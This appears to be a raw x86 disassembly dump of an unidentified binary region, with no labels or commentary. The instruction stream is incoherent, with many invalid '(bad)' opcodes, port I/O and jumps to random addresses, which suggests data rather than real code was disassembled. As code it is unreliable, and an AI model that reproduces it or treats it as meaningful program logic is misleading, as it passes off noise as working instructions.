  423f49:	adc    BYTE PTR [ebx*8-0x3958569d],ch
  423f50:	ret    0x40a8
  423f53:	test   eax,0x5a49c298
  423f58:	pop    ebx
  423f59:	or     edx,0x48ee2ac2
  423f5f:	nop
  423f60:	inc    eax
  423f61:	sub    edi,DWORD PTR [eax]
  423f63:	push   edx
  423f64:	clc    
  423f65:	shl    BYTE PTR gs:[edx],cl
  423f68:	(bad)  
  423f69:	pop    edx
  423f6a:	fwait
  423f6b:	and    BYTE PTR [eax+0x4780b3a0],dh
  423f71:	inc    edi
  423f72:	jp     0x423feb
  423f74:	inc    ebp
  423f75:	out    dx,al
  423f76:	mov    bl,0x82
  423f78:	pop    ss
  423f79:	mov    dh,0x54
  423f7b:	sub    al,0x9e
  423f7d:	cmp    DWORD PTR [ecx-0x63946467],esi
  423f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f84:	dec    ebp
  423f85:	xor    al,0x7b
  423f87:	(bad)  [esi-0x55dec05c]
  423f8d:	xchg   ecx,eax
  423f8e:	push   edx
  423f8f:	cmp    BYTE PTR [ebp+eax*4+0x5fe60613],al
  423f96:	adc    BYTE PTR [ebx],bl
  423f98:	ss fcmovbe st,st(6)
  423f9b:	xor    al,0x76
  423f9d:	fmul   DWORD PTR [ebp+0x2c]
  423fa0:	push   esp
  423fa1:	adc    eax,0x14154a55
  423fa6:	xlat   BYTE PTR ds:[ebx]
  423fa7:	mov    al,0xd1
  423fa9:	cmc    
  423faa:	pop    es
  423fab:	into   
  423fac:	hlt    
  423fad:	rol    DWORD PTR [edx],1
  423faf:	hlt    
  423fb0:	jne    0x423fb1
  423fb2:	add    esi,DWORD PTR [ebp+0x33]
  423fb5:	rol    esp,0xe3
  423fb8:	ins    BYTE PTR es:[edi],dx
  423fb9:	mov    ch,0xf6
  423fbb:	leave  
  423fbc:	mov    ch,0xdd
  423fbe:	sub    BYTE PTR [edi-0x1a],ch
  423fc1:	jecxz  0x423f6a
  423fc3:	loopne 0x423f89
  423fc5:	loop   0x423fbc
  423fc7:	mov    ah,BYTE PTR [ecx-0x5034cfcf]
  423fcd:	out    0x27,eax
  423fcf:	mov    esp,0x17ac7b50
  423fd4:	xor    DWORD PTR [esi-0x28],ecx
  423fd7:	std    
  423fd8:	pop    ss
  423fd9:	in     eax,dx
  423fda:	cld    
  423fdb:	mov    dl,0x6e
  423fdd:	mov    WORD PTR [edx+ebx*1],?
  423fe0:	jne    0x424034
  423fe2:	pop    es
  423fe3:	fimul  DWORD PTR ds:0x7f1e
  423fe8:	ficomp DWORD PTR [esi-0x4b]
  423feb:	push   ss
  423fec:	cmp    al,0xe3
  423fee:	pop    edx
  423fef:	pop    eax
  423ff0:	mov    al,BYTE PTR [esp+ebx*2-0x521cb6ac]
  423ff7:	stc    
  423ff8:	pop    ss
  423ff9:	mov    ds:0x961c42fa,eax
  423ffe:	jg     0x423f86
  424000:	add    eax,0xa3116f1
  424005:	sbb    DWORD PTR fs:[esi-0x1],edi
  424009:	imul   edi,DWORD PTR [eax],0xffffffeb
  42400c:	pushf  
  42400d:	lds    edx,FWORD PTR [ecx-0x26]
  424010:	les    esp,FWORD PTR [ebp+0x33]
  424013:	sub    BYTE PTR [esi],0x9f
  424016:	cmp    eax,DWORD PTR [edx]
  424018:	sbb    DWORD PTR [ebp+0x56f5ebe3],edi
  42401e:	das    
  42401f:	cmp    DWORD PTR [edi-0x1ec05a5c],esp
  424025:	xchg   ebx,eax
  424026:	in     eax,0x82
  424028:	jle    0x424098
  42402a:	and    eax,0x5b359cc6
  42402f:	mov    ch,0xd5
  424031:	dec    edi
  424032:	cmp    BYTE PTR [ecx+0xe3e6244],0x1c
  424039:	jb     0x423fbc
  42403b:	loop   0x423fea
  42403d:	ja     0x42407e
  42403f:	inc    esp
  424040:	pusha  
  424041:	mov    ds:0x1d171be0,al
  424046:	(bad)  
  424047:	mov    cl,0x3b
  424049:	add    eax,0xc37b9172
  42404e:	shl    dh,1
  424050:	and    ecx,DWORD PTR [ebp+0x160b406c]
  424056:	cmc    
  424057:	arpl   WORD PTR ds:0xa98e913,cx
  42405d:	mov    ah,0xb3
  42405f:	stc    
  424060:	push   ss
  424061:	lods   al,BYTE PTR ds:[esi]
  424062:	dec    edi
  424063:	or     cl,BYTE PTR [eax]
  424065:	fldlg2 
  424067:	fwait
  424068:	lods   eax,DWORD PTR ds:[esi]
  424069:	shl    al,1
  42406b:	or     DWORD PTR [eax-0x47],0x5e
  42406f:	mov    ebx,0x87834ff0
  424074:	mov    ah,0xcd
  424076:	push   ebp
  424077:	push   ds
  424078:	in     al,dx
  424079:	or     edx,ecx
  42407b:	cmp    bh,cl
  42407d:	cld    
  42407e:	mov    esp,0x65583304
  424083:	hlt    
  424084:	inc    ecx
  424085:	loope  0x4240e9
  424087:	xchg   ebx,eax
  424088:	jmp    0xb8e6:0x989bc012
  42408f:	sti    
  424090:	popf   
  424091:	mov    cl,0xc2
  424093:	pop    ds
  424094:	shl    DWORD PTR [edx],1
  424096:	or     eax,0x25b0e67a
  42409b:	in     al,0xdb
  42409d:	add    al,BYTE PTR [eax-0x51]
  4240a0:	push   ebp
  4240a1:	inc    ebp
  4240a2:	cwde   
  4240a3:	and    eax,0x93df51c8
  4240a8:	fcom   QWORD PTR [edx+eax*4-0x7066fa7b]
  4240af:	or     eax,0x86a34c8d
  4240b4:	sub    BYTE PTR [ebp-0x65],bh
  4240b7:	test   edi,esp
  4240b9:	imul   eax,DWORD PTR [ecx],0x55860454
  4240bf:	mov    ebx,0x32a6845a
  4240c4:	fdivr  QWORD PTR [esi]
  4240c6:	add    cl,BYTE PTR [esi-0x5]
  4240c9:	scas   eax,DWORD PTR es:[edi]
  4240ca:	retf   
  4240cb:	dec    esi
  4240cc:	test   al,0x1
  4240ce:	mov    ch,0xbb
  4240d0:	ss cmp al,bl
  4240d3:	loope  0x4240fb
  4240d5:	(bad)  
  4240d6:	in     al,0x5
  4240d8:	(bad)
  4240dc:	or     ecx,DWORD PTR [eax-0x7d184b2d]
  4240e2:	pop    ecx
  4240e3:	test   DWORD PTR [esi-0x11],ebp
  4240e6:	std    
  4240e7:	push   ds
  4240e8:	pop    esp
  4240e9:	push   es
  4240ea:	xchg   esp,eax
  4240eb:	cmp    edi,DWORD PTR [edi+0x4e]
  4240ee:	mov    ecx,0xd8a971e3
  4240f3:	pop    es
  4240f4:	scas   al,BYTE PTR es:[edi]
  4240f5:	mov    bl,BYTE PTR [ebx+0x47]
  4240f8:	retf   
  4240f9:	pop    ebp
  4240fa:	imul   ebx,DWORD PTR [ebx],0x5f
  4240fd:	and    bl,ch
  4240ff:	jno    0x424118
  424101:	imul   ebp,DWORD PTR [edi-0x65],0x67df7ab6
  424108:	nop
  424109:	shl    BYTE PTR [esi+0x72f0faea],cl
  42410f:	inc    edi
  424110:	fs inc esp
  424112:	add    DWORD PTR [ecx-0x77],edx
  424115:	aad    0x2d
  424117:	adc    esi,edx
  424119:	pop    edi
  42411a:	xlat   BYTE PTR ds:[ebx]
  42411b:	in     eax,0xd0
  42411d:	rcl    DWORD PTR [esi+0x7d4ccc4c],0xfe
  424124:	and    BYTE PTR [ebp-0x71453e6d],0xba
  42412b:	mov    al,ds:0x3c7929fc
  424130:	call   0xd6bc:0x8d184b27
  424137:	pop    ss
  424138:	mov    ds:0x2da05d36,al
  42413d:	cmp    eax,0xb998e009
  424142:	or     ah,BYTE PTR [edi+ebp*8+0x65]
  424146:	adc    edx,DWORD PTR [edi+0x7c4bdd3b]
  42414c:	jo     0x4241a4
  42414e:	inc    esi
  42414f:	shl    BYTE PTR [edi+0x28],1
  424152:	inc    edi
  424153:	(bad)  
  424154:	ficom  DWORD PTR [ebx]
  424156:	in     eax,dx
  424157:	call   FWORD PTR [eax+0x37cf7598]
  42415d:	push   0x4ed5874c
  424162:	sbb    DWORD PTR [ebx+eiz*2-0x738a5aa6],0xefc1be86
  42416d:	pop    ebp
  42416e:	jmp    0xa68a0637
  424173:	iret   
  424174:	pop    ecx
  424175:	(bad)
  424178:	pop    es
  424179:	inc    edi
  42417a:	daa    
  42417b:	test   BYTE PTR [edi+0x51],bh
  42417e:	push   0x1f235d30
  424183:	sbb    esp,edi
  424185:	push   es
  424186:	xchg   ebx,eax
  424187:	mov    ecx,esi
  424189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42418a:	fs lock sbb al,0xe4
  42418e:	and    dh,BYTE PTR [esi]
  424190:	fimul  DWORD PTR [edx]
  424192:	lahf   
  424193:	add    cl,dl
  424195:	dec    ebx
  424196:	pop    es
  424197:	(bad)  
  424198:	gs mov ch,0x9f
  42419b:	loope  0x4241c7
  42419d:	sbb    DWORD PTR [esi+0x23650b32],edx
  4241a3:	add    esi,DWORD PTR [ebp+0x3712554c]
  4241a9:	inc    edi
  4241aa:	or     DWORD PTR [ebx],0x7b0e386a
  4241b0:	std    
  4241b1:	xchg   edx,eax
  4241b2:	push   esi
  4241b3:	in     eax,dx
  4241b4:	stc    
  4241b5:	pop    esi
  4241b6:	cdq    
  4241b7:	dec    edi
  4241b8:	sub    bh,ch
  4241ba:	leave  
  4241bb:	(bad)  
  4241bc:	cmp    DWORD PTR [ecx],edi
  4241be:	or     eax,0xd15a1122
  4241c3:	and    ebx,DWORD PTR [edi+0x43550d5c]
  4241c9:	add    al,0xfc
  4241cb:	xor    DWORD PTR [ebx+0x68],ebp
  4241ce:	dec    ebx
  4241cf:	lds    ecx,FWORD PTR [ebx]
  4241d1:	xchg   ecx,eax
  4241d2:	mov    esp,0xc144f50b
  4241d7:	fisubr DWORD PTR [ebp+0xd]
  4241da:	push   esp
  4241db:	mov    dh,0x9b
  4241dd:	data16 jbe 0x42420e
  4241e0:	int    0x5c
  4241e2:	gs pop edx
  4241e4:	mov    ds:0x8836a45,al
  4241e9:	push   esp
  4241ea:	arpl   WORD PTR [ebx],ax
  4241ec:	inc    ecx
  4241ed:	bound  esi,QWORD PTR [ebx+0x7a]
  4241f0:	mov    dh,0xdd
  4241f2:	leave  
  4241f3:	sar    ecx,0x1a
  4241f6:	add    DWORD PTR [eax+0x7ffdf18b],0xffffffa9
  4241fd:	mov    eax,ds:0xa373c7eb
  424202:	test   eax,0xf070fed8
  424207:	retf   0x2ee2
  42420a:	fiadd  DWORD PTR [edx-0x1d268c2f]
  424210:	mov    edi,0x1adcec5a
  424215:	aas    
  424216:	sub    dl,BYTE PTR [ebp-0x17e90371]
  42421c:	mov    ebp,0x1b3f8afa
  424221:	dec    ecx
  424222:	hlt    
  424223:	mov    al,0xbc
  424225:	fistp  QWORD PTR [edi-0x17]
  424228:	arpl   WORD PTR [ebp+0x22],bp
  42422b:	(bad)
  42422e:	fwait
  42422f:	or     BYTE PTR [edi-0x40],ah
  424232:	or     al,bh
  424234:	add    DWORD PTR [edx],ecx
  424236:	sub    bh,BYTE PTR [esi-0x57]
  424239:	xchg   edx,eax
  42423a:	loop   0x424225
  42423c:	xchg   edi,eax
  42423d:	pop    es
  42423e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42423f:	nop
  424240:	push   eax
  424241:	call   0xd9ba398b
  424246:	mov    ch,0xf8
  424248:	or     DWORD PTR [ebp+esi*2+0x16],edx
  42424c:	inc    edx
  42424d:	mov    cl,BYTE PTR [edx-0x41]
  424250:	outs   dx,DWORD PTR ds:[esi]
  424251:	ss jmp 0x72e2d0c1
  424257:	or     esp,DWORD PTR [ebx+eax*4]
  42425a:	adc    BYTE PTR [eax-0x195184e3],ah
  424260:	mov    ecx,esi
  424262:	fs push ecx
  424264:	in     eax,0x88
  424266:	add    al,0x40
  424268:	and    al,0x9e
  42426a:	in     eax,0x54
  42426c:	ds xchg ecx,eax
  42426e:	daa    
  42426f:	xchg   ebp,eax
  424270:	test   BYTE PTR [ecx+ebx*8],cl
  424273:	mov    cl,0xcc
  424275:	push   ss
  424276:	adc    DWORD PTR [ebx+0x7a5ae058],esi
  42427c:	pop    edi
  42427d:	add    al,0x8d
  42427f:	scas   eax,DWORD PTR es:[edi]
  424280:	sbb    DWORD PTR [edx+0x30],edx
  424283:	add    ecx,DWORD PTR [edi+0x4]
  424286:	xchg   DWORD PTR [eax-0x6b74ce13],ebp
  42428c:	std    
  42428d:	imul   edx,edx,0x6d88e77
  424293:	xor    DWORD PTR [ebp-0x1a],0xffeadf82
  42429a:	les    esi,FWORD PTR [edx]
  42429c:	imul   ebp,DWORD PTR [ebx],0xeecad81a
  4242a2:	pusha  
  4242a3:	aam    0x52
  4242a5:	retw   0x9e8
  4242a9:	pop    ebx
  4242aa:	retf   0xd672
  4242ad:	xor    eax,0x24e4a176
  4242b2:	mov    cl,0x1e
  4242b4:	aam    0x76
  4242b6:	ss nop
  4242b8:	pop    ecx
  4242b9:	loop   0x4242fe
  4242bb:	mov    bh,BYTE PTR [ebp-0x57]
  4242be:	mov    es,ebp
  4242c0:	fld    st(6)
  4242c2:	rol    BYTE PTR [eax-0x13147636],cl
  4242c8:	jb     0x42424a
  4242ca:	out    dx,eax
  4242cb:	in     eax,dx
  4242cc:	(bad)  [esi+0x27a14fff]
  4242d2:	out    0xb4,eax
  4242d4:	pop    esi
  4242d5:	sub    al,0xa1
  4242d7:	push   edx
  4242d8:	push   ebp
  4242d9:	sar    BYTE PTR [edi+0x1],cl
  4242dc:	mov    ah,0xb3
  4242de:	mov    ecx,edx
  4242e0:	sbb    al,0x3
  4242e2:	into   
  4242e3:	retf   
  4242e4:	rcl    ch,cl
  4242e6:	cmp    al,0xd8
  4242e8:	stos   DWORD PTR es:[edi],eax
  4242e9:	mov    ebp,0x9ff644b9
  4242ee:	push   edi
  4242ef:	inc    edi
  4242f0:	int3   
  4242f1:	and    DWORD PTR [eax-0x48],0xffffffe7
  4242f5:	test   eax,0x7621a690
  4242fa:	xchg   esi,eax
  4242fb:	out    0x9f,eax
  4242fd:	xor    ch,0x71
  424300:	mov    dl,0x3d
  424302:	test   esp,0x5e3f54ee
  424308:	fwait
  424309:	sbb    eax,DWORD PTR [ebx+eax*8+0x73]
  42430d:	cmp    DWORD PTR [ecx+0x6074f0c6],ecx
  424313:	jno    0x424325
  424315:	mov    dl,0xa
  424317:	dec    ecx
  424318:	popa   
  424319:	cwde   
  42431a:	push   ecx
  42431b:	scas   al,BYTE PTR es:[edi]
  42431c:	pop    esp
  42431e:	aas    
  42431f:	clc    
  424320:	pop    esp
  424321:	out    dx,al
  424322:	push   ss
  424323:	cmp    ch,BYTE PTR [edi+0x60]
  424326:	loope  0x42438d
  424328:	mov    bl,0x98
  42432a:	push   ecx
  42432b:	inc    ecx
  42432c:	dec    eax
  42432d:	jbe    0x4242bc
  42432f:	jo     0x42437e
  424331:	fldcw  WORD PTR [ecx]
  424333:	mov    al,0xcf
  424335:	mov    dl,0x50
  424337:	test   ah,cl
  424339:	add    al,0x69
  42433b:	dec    esp
  42433c:	(bad)  
  42433d:	retf   0xf09a
  424340:	stos   BYTE PTR es:[edi],al
  424341:	out    dx,al
  424342:	retf   
  424343:	mov    ?,WORD PTR [edx-0x2b]
  424346:	sub    al,ch
  424348:	add    ch,BYTE PTR [esi-0x55998877]
  42434e:	jle    0x4242fd
  424350:	int    0x39
  424352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424353:	cmp    ebx,DWORD PTR [edx-0x329b9ead]
  424359:	lock rcr BYTE PTR [edx+ebp*8],cl
  42435d:	fwait
  42435e:	out    0x2f,eax
  424360:	adc    dl,BYTE PTR [ecx]
  424362:	fwait
  424363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424364:	js     0x4243d7
  424366:	out    dx,al
  424367:	test   ebx,edx
  424369:	jmp    0xf753:0xe49911d8
  424370:	jp     0x424321
  424372:	cld    
  424373:	sbb    edi,ebx
  424375:	stc    
  424376:	dec    edx
  424377:	or     eax,0xc97e44b9
  42437c:	sahf   
  42437d:	ret    0x3ed3
  424380:	mov    bh,ch
  424382:	rcl    DWORD PTR [esi+0x4aebeb9a],cl
  424388:	pop    ebx
  424389:	and    cl,BYTE PTR [edx]
  42438b:	out    0xe7,al
  42438d:	(bad)  
  42438f:	cmp    DWORD PTR [edi+esi*2-0x554271c2],ebx
  424396:	sub    ebx,DWORD PTR [edi+esi*2]
  424399:	mov    ebx,0xe4e9fb27
  42439e:	and    eax,0x72596a5
  4243a3:	pop    ecx
  4243a4:	out    dx,eax
  4243a5:	adc    ch,BYTE PTR [edx+esi*1+0x78]
  4243a9:	push   edx
  4243aa:	mov    ebx,0x8d42a33b
  4243af:	idiv   BYTE PTR [ebx+edx*2]
  4243b2:	sbb    BYTE PTR [ecx],dl
  4243b4:	dec    edx
  4243b5:	clc    
  4243b6:	cmp    al,0xff
  4243b9:	and    DWORD PTR [esi-0x19cf8ea9],esp
  4243bf:	add    BYTE PTR [edx],al
  4243c1:	(bad)  
  4243c2:	cmp    bl,BYTE PTR [edi]
  4243c4:	test   DWORD PTR [ecx+0x2b],esp
  4243c7:	pop    ds
  4243c8:	hlt    
  4243c9:	mov    BYTE PTR [esi],dl
  4243cb:	pop    es
  4243cc:	mov    ds:0xec180323,eax
  4243d1:	jl     0x4243b0
  4243d3:	js     0x424453
  4243d5:	mov    cl,0xf2
  4243d7:	loopne 0x424431
  4243d9:	test   al,0x64
  4243db:	lea    eax,[ebp+0x17c50964]
  4243e1:	fcomp  DWORD PTR [ebx+0x785e4584]
  4243e7:	sub    eax,0x9f74d8da
  4243ec:	mov    dh,0x56
  4243ee:	cmp    ebx,DWORD PTR [eax+ebp*2+0x62]
  4243f2:	aad    0x2c
  4243f4:	imul   ecx,DWORD PTR [esi+0x1533a18c],0x2a
  4243fb:	adc    BYTE PTR [edi],0xac
  4243fe:	(bad)  [ebx]
  424400:	int    0x6b
  424402:	das    
  424403:	jecxz  0x42447d
  424405:	adc    BYTE PTR [ebx-0x5837ca2f],0x38
  42440c:	mov    al,0x19
  42440e:	fst    QWORD PTR [eax+0xda8e877]
  424414:	and    ebx,ebx
  424416:	dec    ecx
  424417:	fcomp  DWORD PTR [edx-0x56]
  42441a:	xor    BYTE PTR [edi+edi*1+0x10],dh
  42441e:	add    BYTE PTR [eax],al
  424420:	add    BYTE PTR [eax],al
  424422:	sub    al,0xda
  424424:	iret   
  424425:	cmp    bh,0x95
  424428:	outs   dx,DWORD PTR ds:[esi]
  424429:	(bad)  
  42442a:	jecxz  0x4243f5
  42442c:	push   ds
  42442d:	ins    DWORD PTR es:[edi],dx
  42442e:	mov    ah,0xcd
  424430:	stos   BYTE PTR es:[edi],al
  424431:	cmp    al,BYTE PTR [ebp-0x43]
  424434:	add    DWORD PTR [eax],eax
  424436:	hlt    
  424437:	add    al,0x0
  424439:	add    BYTE PTR [edi-0x7f],cl
  42443c:	cmp    DWORD PTR [eax],0xf453345f
  424442:	adc    esi,DWORD PTR [esi+0x133ff50d]
  424448:	mov    esp,0x59ca0702
  42444d:	sub    eax,0x2ee670b8
  424452:	mov    WORD PTR [ecx-0x16dae6],cs
  424458:	aam    0x5f
  42445a:	adc    BYTE PTR [ecx],0xf0
  42445d:	outs   dx,DWORD PTR ds:[esi]
  42445e:	xchg   ebp,eax
  42445f:	ins    DWORD PTR es:[edi],dx
  424460:	jg     0x42449f
  424462:	cdq    
  424463:	or     ecx,esi
  424465:	jmp    DWORD PTR [edi-0x29e53d92]
  42446b:	jbe    0x4244b2
  42446d:	jb     0x424486
  42446f:	in     al,dx
  424470:	and    DWORD PTR [ecx+0x2c88c21e],eax
  424476:	and    eax,ecx
  424478:	ins    BYTE PTR es:[edi],dx
  424479:	repz xchg ebp,eax
  42447b:	or     eax,0x365247bb
  424480:	or     edx,esi
  424482:	pop    edi
  424483:	(bad)  
  424484:	push   edi
  424485:	mov    ds:0x4e0b5540,al
  42448a:	adc    eax,DWORD PTR [eax]
  42448c:	gs hlt 
  42448e:	pop    esp
  42448f:	mov    dh,0x19
  424491:	pop    ebp
  424492:	(bad)  
  424493:	ficom  WORD PTR [ebp+0x4]
  424496:	loope  0x4244b9
  424498:	mov    ebx,0x3f5fb671
  42449d:	xor    DWORD PTR [esp+ecx*2],edx
  4244a0:	inc    esp
  4244a1:	(bad)  
  4244a2:	jmp    0x34040896
  4244a7:	add    BYTE PTR [ecx],0x7c
  4244aa:	rcr    BYTE PTR [ebx+0x3c805935],0x96
  4244b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244b2:	sub    BYTE PTR [ecx-0x2517ec89],cl
  4244b8:	sub    BYTE PTR [ebx+0xb],al
  4244bb:	jg     0x4244eb
  4244bd:	mov    ebp,0x2cbe0ca7
  4244c2:	xchg   esp,eax
  4244c3:	or     dh,BYTE PTR [edi+0x59d9c893]
  4244c9:	loop   0x424500
  4244cb:	fs push ebp
  4244cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244ce:	sbb    ch,BYTE PTR [edx-0x51]
  4244d1:	and    BYTE PTR [edi+0x2b],bl
  4244d4:	aaa    
  4244d5:	or     bh,al
  4244d7:	xor    edi,edi
  4244d9:	and    eax,0x8bcbdd9b
  4244de:	push   edx
  4244df:	xor    DWORD PTR [edx-0x215842ea],edi
  4244e5:	lds    ecx,FWORD PTR [edx+0x4b]
  4244e8:	push   ebp
  4244e9:	jno    0x424545
  4244eb:	dec    bx
  4244ed:	in     al,0xaf
  4244ef:	and    dh,BYTE PTR [eax+0x7f]
  4244f2:	adc    al,0xfc
  4244f4:	mov    ebx,0x42fb3847
  4244f9:	inc    eax
  4244fa:	mov    ebx,0x2daefd0b
  4244ff:	adc    ebx,DWORD PTR [edi-0x61]
  424502:	popf   
  424503:	or     ch,BYTE PTR [edi+0xf]
  424506:	data16 clc 
  424508:	cmp    al,0xe5
  42450a:	jbe    0x42453d
  42450c:	aad    0x2f
  42450e:	call   0xaef613b7
  424513:	mov    edx,DWORD PTR [edi-0x39]
  424516:	mov    edx,0xa54ecc7d
  42451b:	jae    0x42457e
  42451d:	jo     0x424570
  42451f:	daa    
  424520:	push   es
  424521:	cs das 
  424523:	clc    
  424524:	dec    edi
  424525:	out    0x21,eax
  424527:	pop    ebx
  424528:	outs   dx,DWORD PTR ds:[esi]
  424529:	das    
  42452a:	rcl    DWORD PTR [eax],0xf3
  42452d:	arpl   WORD PTR [esi],ax
  42452f:	shl    eax,cl
  424531:	outs   dx,BYTE PTR ds:[esi]
  424532:	test   BYTE PTR [esi-0x58],cl
  424535:	sbb    al,bh
  424537:	jg     0x42457b
  424539:	add    edi,eax
  42453b:	add    BYTE PTR ds:0x1cab944a,al
  424541:	push   ecx
  424542:	aad    0xa4
  424544:	arpl   WORD PTR [edi],bp
  424546:	into   
  424547:	xor    esp,0xe980abee
  42454d:	adc    eax,0x2875fcb7
  424552:	scas   al,BYTE PTR es:[edi]
  424553:	and    eax,0x2ba029cb
  424558:	jbe    0x424500
  42455a:	xchg   DWORD PTR ds:0x9cd5aed4,ecx
  424560:	mov    bh,0x28
  424562:	xor    eax,0x83e330b
  424567:	mov    dl,0xd
  424569:	or     dl,BYTE PTR [eax-0x4f]
  42456c:	jecxz  0x4245dd
  42456e:	and    eax,0xcd7604f6
  424573:	outs   dx,BYTE PTR ds:[esi]
  424574:	nop
  424575:	cld    
  424576:	dec    esp
  424577:	(bad)  
  424579:	nop
  42457a:	out    dx,al
  42457b:	icebp  
  42457c:	scas   al,BYTE PTR es:[edi]
  42457d:	or     dl,0x64
  424580:	imul   ebx,DWORD PTR [edx-0x7c],0xa62c2461
  424587:	xchg   esi,eax
  424588:	inc    esi
  424589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42458a:	pop    ss
  42458b:	cdq    
  42458c:	or     BYTE PTR [esi],bl
  42458e:	sub    ebx,DWORD PTR [esi+edi*4+0x40]
  424592:	retfw  
  424594:	mov    bh,0x36
  424596:	stc    
  424597:	loopne 0x4245dc
  424599:	jecxz  0x4245fb
  42459b:	mov    ds:0xb3ca6095,al
  4245a0:	repz inc ecx
  4245a2:	stos   BYTE PTR es:[edi],al
  4245a3:	inc    ebp
  4245a4:	mov    bh,0xaf
  4245a6:	out    dx,eax
  4245a7:	push   ecx
  4245a8:	inc    esi
  4245a9:	add    ebx,0xe257b4ec
  4245af:	and    ecx,esi
  4245b1:	mov    BYTE PTR [ebp-0x459052a9],cl
  4245b7:	ret    0xf982
  4245ba:	push   0xffffff89
  4245bc:	and    dl,BYTE PTR [edx-0x1ac66cf3]
  4245c2:	fstp   DWORD PTR [esi]
  4245c4:	int3   
  4245c5:	sub    al,0x3c
  4245c7:	push   esi
  4245c8:	mov    edi,0xb9cbc30
  4245cd:	retf   
  4245ce:	or     dl,BYTE PTR [edx+0x78]
  4245d1:	xchg   dh,bl
  4245d3:	mov    esi,0x836bfd98
  4245d8:	bt     esp,ebx
  4245db:	adc    al,0x17
  4245dd:	dec    esp
  4245de:	into   
  4245df:	push   ecx
  4245e0:	in     eax,0xb2
  4245e2:	fsubr  DWORD PTR [ebx+edi*4+0x3278fef3]
  4245e9:	xchg   ebp,eax
  4245ea:	fnstsw WORD PTR [edx-0x1a]
  4245ed:	in     al,0x2e
  4245ef:	mov    bl,0x41
  4245f1:	imul   edi,DWORD PTR [edi+0x5b],0xffffff8d
  4245f5:	inc    ecx
  4245f6:	repz adc BYTE PTR [ecx],dl
  4245f9:	mov    dh,0x9
  4245fb:	ret    0x4d9d
  4245fe:	cld    
  4245ff:	cmp    eax,0x4408266b
  424604:	ss pop ecx
  424606:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  424608:	repnz and ebp,0x1b
  42460c:	setl   bl
  42460f:	jmp    0xb95dfe1c
  424614:	in     eax,dx
  424615:	adc    DWORD PTR [edx-0x6f73fa9],0xffffff9a
  42461c:	inc    edi
  42461d:	add    eax,DWORD PTR [edi]
  42461f:	sar    esp,1
  424621:	xchg   edx,eax
  424622:	mov    eax,0xec099ae5
  424627:	sbb    cl,BYTE PTR [esi+0x12]
  42462a:	sti    
  42462b:	popa   
  42462c:	test   eax,0x3d312ff7
  424631:	les    esp,FWORD PTR [ebp-0x13]
  424634:	bnd call 0x2e594930
  42463a:	scas   al,BYTE PTR es:[edi]
  42463b:	xlat   BYTE PTR ds:[ebx]
  42463c:	ins    BYTE PTR es:[edi],dx
  42463d:	cwde   
  42463e:	adc    bh,BYTE PTR [ebx]
  424640:	jne    0x424600
  424642:	retf   
  424643:	stos   DWORD PTR es:[edi],eax
  424644:	pop    edi
  424645:	jmp    0x42465b
  424647:	popf   
  424648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424649:	xor    al,0x39
  42464b:	sar    edx,0xa0
  42464e:	mov    ah,0x77
  424650:	in     eax,0x7c
  424652:	retf   
  424653:	push   0x7aa74904
  424658:	enter  0xd912,0x89
  42465c:	arpl   WORD PTR [esi+0x784603b0],ax
  424662:	dec    eax
  424663:	test   BYTE PTR [edi-0x74056682],dh
  424669:	pop    eax
  42466a:	jo     0x424621
  42466c:	xchg   edx,eax
  42466d:	push   edx
  42466e:	retf   0xa764
  424671:	add    ch,bl
  424673:	mov    bl,0x0
  424675:	cmp    ecx,DWORD PTR [ebp+0x3b8a14a6]
  42467b:	mov    ah,0x1
  42467d:	sbb    eax,0xcf06d11f
  424682:	loop   0x4246cf
  424684:	mov    WORD PTR [eax-0x33784ee4],gs
  42468a:	loopne 0x424685
  42468c:	dec    ecx
  42468d:	jne    0x424623
  42468f:	adc    bl,BYTE PTR [esi+0x20]
  424692:	xor    al,0xe9
  424694:	cmp    DWORD PTR [ebx],ebx
  424696:	pushf  
  424697:	pop    ds
  424698:	and    al,0x87
  42469a:	push   ecx
  42469b:	ins    BYTE PTR es:[edi],dx
  42469c:	pushf  
  42469d:	aad    0xbb
  42469f:	ret    
  4246a0:	mov    edi,0x50ae7d0d
  4246a5:	or     BYTE PTR [ecx+0x17],0xdb
  4246a9:	dec    ebx
  4246aa:	cmp    edx,ebp
  4246ac:	(bad)  
  4246ad:	xor    BYTE PTR [ecx-0x16],cl
  4246b0:	and    edx,0xffffffcb
  4246b3:	xor    DWORD PTR [esi+0x41],edi
  4246b6:	and    ecx,DWORD PTR [edx+eax*4]
  4246b9:	repnz (bad) 
  4246bc:	adc    eax,0x6df88734
  4246c1:	test   al,0x27
  4246c3:	or     al,0xb7
  4246c5:	cdq    
  4246c6:	jecxz  0x42467b
  4246c8:	push   ds
  4246c9:	and    ebp,esp
  4246cb:	jae    0x4246a4
  4246cd:	and    al,0xf3
  4246cf:	pushf  
  4246d0:	push   ecx
  4246d1:	call   0x577f6450
  4246d6:	jnp    0x4246ce
  4246d8:	das    
  4246d9:	jmp    0x7224768e
  4246de:	test   DWORD PTR ds:0x5f2a578c,edi
  4246e4:	sub    bl,BYTE PTR [eax-0x24]
  4246e7:	cmp    al,0xef
  4246e9:	sti    
  4246ea:	fsubr  DWORD PTR [esi-0x73fb9c2d]
  4246f0:	mov    ah,0xb4
  4246f2:	xchg   edi,eax
  4246f3:	mov    ebp,0xc9b7b346
  4246f8:	and    edx,DWORD PTR [edx+0x39986fec]
  4246fe:	mov    dl,0x9b
  424700:	inc    ebx
  424701:	push   0xffffffe0
  424703:	call   0x2cae373b
  424708:	jbe    0x424726
  42470a:	pushf  
  42470b:	inc    ebx
  42470c:	or     bl,dl
  42470e:	and    al,0x50
  424710:	das    
  424711:	sub    al,BYTE PTR [ebp+0x45]
  424714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424715:	xchg   ebp,eax
  424716:	dec    esp
  424717:	or     eax,DWORD PTR [ecx]
  424719:	ret    
  42471a:	dec    ebx
  42471b:	fadd   st(3),st
  42471d:	jne    0x4246fa
  42471f:	pusha  
  424720:	int    0xe3
  424722:	in     al,dx
